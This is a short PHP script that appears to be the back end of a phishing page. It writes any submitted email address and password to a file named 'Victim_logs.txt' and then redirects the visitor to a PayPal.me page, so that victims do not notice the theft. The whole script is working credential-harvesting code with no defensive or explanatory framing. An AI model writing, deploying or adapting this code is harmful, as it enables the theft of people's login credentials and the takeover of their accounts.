<?php

file_put_contents("Victim_logs.txt", "Account: " . $_POST['Email'] . " Pass: " . $_POST['Passwd'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.me/OfficialEvilDevil/');
exit();
